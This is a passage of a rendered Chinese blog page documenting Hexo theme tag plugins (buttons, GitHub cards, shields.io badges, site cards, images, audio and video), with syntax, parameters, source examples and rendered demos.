 <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div>2.或者含有图标的按钮<div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中<div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p red'>专业版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p green'>免费版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'></a>          </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-12-github卡片-ghcard">2.12 github卡片 ghcard</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ghcard 用户名, 其它参数（可选） %&#125;</span><br><span class="line">&#123;% ghcard 用户名/仓库, 其它参数（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>使用<code>,</code>分割各个参数。写法为：<code>参数名=参数值</code><br>以下只写几个常用参数值。</p><table><thead><tr><th><strong>参数名</strong></th><th>取值</th><th>释义</th></tr></thead><tbody><tr><td>hide</td><td>stars,commits,prs,issues,contribs</td><td>隐藏指定统计</td></tr><tr><td>count_private</td><td>true</td><td>将私人项目贡献添加到总提交计数中</td></tr><tr><td>show_icons</td><td>true</td><td>显示图标</td></tr><tr><td>theme</td><td>查阅:<a href="https://github.com/anuraghazra/github-readme-stats/blob/master/themes/README.md">Available Themes</a></td><td>主题</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.用户信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard fomalhaut1998 %&#125; | &#123;% ghcard fomalhaut1998, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=buefy %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=onedark %&#125; | &#123;% ghcard fomalhaut1998, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard fomalhaut1998, theme=algolia %&#125; | &#123;% ghcard fomalhaut1998, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><p>2.仓库信息卡片</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=vue %&#125; |</span><br><span class="line">| -- | -- |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=buefy %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-light %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=onedark %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=solarized-dark %&#125; |</span><br><span class="line">| &#123;% ghcard volantis-x/hexo-theme-volantis, theme=algolia %&#125; | &#123;% ghcard volantis-x/hexo-theme-volantis, theme=calm %&#125; |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.用户信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/fomalhaut1998"><img src="https://github-readme-stats.vercel.app/api/?username=fomalhaut1998&theme=calm&show_owner=true"/></a></td></tr></tbody></table><p>2.仓库信息卡片</p><table><thead><tr><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&show_owner=true"/></a></th><th><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=vue&show_owner=true"/></a></th></tr></thead><tbody><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=buefy&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-light&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=onedark&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=solarized-dark&show_owner=true"/></a></td></tr><tr><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=algolia&show_owner=true"/></a></td><td><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/volantis-x/hexo-theme-volantis"><img src="https://github-readme-stats.vercel.app/api/pin/?username=volantis-x&repo=hexo-theme-volantis&theme=calm&show_owner=true"/></a></td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-13-github徽标-ghbdage">2.13 github徽标 ghbdage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage [right],[left],[logo]||[color],[link],[title]||[option] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>left</code>：徽标左边的信息，必选参数。</li><li><code>right</code>: 徽标右边的信息，必选参数，</li><li><code>logo</code>：徽标图标，图标名称详见<a href="https://simpleicons.org/">simpleicons</a>，可选参数。</li><li><code>color</code>：徽标右边的颜色，可选参数。</li><li><code>link</code>：指向的链接，可选参数。</li><li><code>title</code>：徽标的额外信息，可选参数。主要用于优化SEO，但<code>object</code>标签不会像<code>a</code>标签一样在鼠标悬停显示<code>title</code>信息。</li><li><code>option</code>：自定义参数，支持<a href="https://shields.io/">shields.io</a>的全部API参数支持，具体参数可以参看上文中的拓展写法示例。形式为<code>name1=value2&amp;name2=value2</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.基本参数,定义徽标左右文字和图标</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Theme,Butterfly %&#125;</span><br><span class="line">&#123;% bdage Frame,Hexo,hexo %&#125;</span><br></pre></td></tr></table></figure><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage CDN,JsDelivr,jsDelivr||abcdef,https://metroui.org.ua/index.html,本站使用JsDelivr为静态资源提供CDN加速 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割</span><br><span class="line">&#123;% bdage Source,GitHub,GitHub||,https://github.com/ %&#125;</span><br></pre></td></tr></table></figure><p>3.拓展参数，支持shields的API的全部参数内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% bdage Hosted,Vercel,Vercel||brightgreen,https://vercel.com/,本站采用双线部署，默认线路托管于Vercel||style=social&amp;logoWidth=20 %&#125;</span><br><span class="line">//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割</span><br><span class="line">&#123;% bdage Hosted,Vercel,Vercel||||style=social&amp;logoWidth=20&amp;logoColor=violet %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.基本参数,定义徽标左右文字和图标</p><p><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Butterfly-Theme-orange?logo=&color=orange&link=&"></object><br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Hexo-Frame-orange?logo=hexo&color=orange&link=&"></object></p><p>2.信息参数，定义徽标右侧内容背景色，指向链接</p><p><object class="ghbdage" style="margin-inline:5px" title="本站使用JsDelivr为静态资源提供CDN加速" standby="loading..." data="https://img.shields.io/badge/JsDelivr-CDN-orange?logo=jsDelivr&color=abcdef&link=https://metroui.org.ua/index.html&"></object><br>//如果是跨顺序省略可选参数，仍然需要写个逗号,用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/GitHub-Source-orange?logo=GitHub&color=orange&link=https://github.com/&"></object></p><p>3.拓展参数，支持shields的API的全部参数内容</p><p><object class="ghbdage" style="margin-inline:5px" title="本站采用双线部署，默认线路托管于Vercel" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=brightgreen&link=https://vercel.com/&style=social&logoWidth=20"></object><br>//如果是跨顺序省略可选参数组，仍然需要写双竖线||用作分割<br><object class="ghbdage" style="margin-inline:5px" title="" standby="loading..." data="https://img.shields.io/badge/Vercel-Hosted-orange?logo=Vercel&color=orange&link=&style=social&logoWidth=20&logoColor=violet"></object></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-14-网站卡片-sites">2.14 网站卡片 sites</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% site 标题, url=链接, screenshot=截图链接, avatar=头像链接（可选）, description=描述（可选） %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% sitegroup %&#125;</span><br><span class="line">&#123;% site xaoxuu, url=https://xaoxuu.com, screenshot=https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg, avatar=https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png, description=简约风格 %&#125;</span><br><span class="line">&#123;% site inkss, url=https://inkss.cn, screenshot=https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg, avatar=https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site MHuiG, url=https://blog.mhuig.top, screenshot=https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png, avatar=https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Colsrch, url=https://colsrch.top, screenshot=https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png, avatar=https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% site Linhk1606, url=https://linhk1606.github.io, screenshot=https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png, avatar=https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png, description=这是一段关于这个网站的描述文字 %&#125;</span><br><span class="line">&#123;% endsitegroup %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="site-card-group"><a class="site-card" href="https://fomalhaut1998.com"><div class="img"><img src="https://i.loli.net/2020/08/21/VuSwWZ1xAeUHEBC.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/avatar/avatar.png"/><span class="title">fomalhaut1998</span><span class="desc">简约风格</span></div></a><a class="site-card" href="https://inkss.cn"><div class="img"><img src="https://i.loli.net/2020/08/21/Vzbu3i8fXs6Nh5Y.jpg"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/inkss/common@master/static/web/avatar.jpg"/><span class="title">inkss</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://blog.mhuig.top"><div class="img"><img src="https://i.loli.net/2020/08/22/d24zpPlhLYWX6D1.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/MHuiG/imgbed@master/data/p.png"/><span class="title">MHuiG</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://colsrch.top"><div class="img"><img src="https://i.loli.net/2020/08/22/dFRWXm52OVu8qfK.png"/></div><div class="info"><img src="https://cdn.jsdelivr.net/gh/Colsrch/images/Colsrch/avatar.jpg"/><span class="title">Colsrch</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a><a class="site-card" href="https://linhk1606.github.io"><div class="img"><img src="https://i.loli.net/2020/08/21/3PmGLCKicnfow1x.png"/></div><div class="info"><img src="https://i.loli.net/2020/02/09/PN7I5RJfFtA93r2.png"/><span class="title">Linhk1606</span><span class="desc">这是一段关于这个网站的描述文字</span></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-15-行内图片-inlineimage">2.15 行内图片 inlineimage</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% inlineimage 图片链接, height=高度（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>高度</code>：height=20px</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif %&#125; 一段话。</span><br><span class="line"></span><br><span class="line">这又是 &#123;% inlineimage https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif, height=40px %&#125; 一段话。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>这是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0000.gif" style="height:1.5em"/> 一段话。</p><p>这又是 <img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/5150.gif" style="height:40px;"/> 一段话。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-16-单张图片-image">2.16 单张图片 image</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image 链接, width=宽度（可选）, height=高度（可选）, alt=描述（可选）, bg=占位颜色（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>图片宽度高度：width=300px, height=32px</li><li>图片描述：alt=图片描述（butterfly需要在主题配置文件中开启图片描述）</li><li>占位背景色：bg=#f2f2f2</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>2.指定宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px %&#125;</span><br></pre></td></tr></table></figure><p>3.指定宽度并添加描述：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, alt=每天下课回宿舍的路，没有什么故事。 %&#125;</span><br></pre></td></tr></table></figure><p>4.设置占位背景色：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% image https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg, width=400px, bg=#1D0C04, alt=优化不同宽度浏览的观感 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.添加描述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>2..指定宽度<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" style="width:400px;"/></div></div>3.指定宽度并添加描述：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="每天下课回宿舍的路，没有什么故事。" style="width:400px;"/></div><span class="image-caption">每天下课回宿舍的路，没有什么故事。</span></div>4.设置占位背景色：<div class="img-wrap"><div class="img-bg" style="background:#1D0C04"><img class="img" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg" alt="优化不同宽度浏览的观感" style="width:400px;"/></div><span class="image-caption">优化不同宽度浏览的观感</span></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-17-音频-audio">2.17 音频 audio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio 音频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% audio https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="audio"><audio controls preload><source src='https://github.com/volantis-x/volantis-docs/releases/download/assets/Lumia1020.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-18-视频-video">2.18 视频 video</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video 视频链接 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>对齐方向</code>：left, center, right</li><li><code>列数</code>：逗号后面直接写列数，支持 1 ～ 4 列。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.100%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br></pre></td></tr></table></figure><p>2.50%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 2 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% endvideos %&#125;</span><br></pre></td></tr></table></figure><p>3.25%宽度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% videos, 4 %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG<span class="emphasis">_0341.mov %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% video https://github.com/volantis-x/volantis-docs/releases/download/assets/IMG_</span>0341.mov %&#125;</span><br><span class="line">&#123;% video 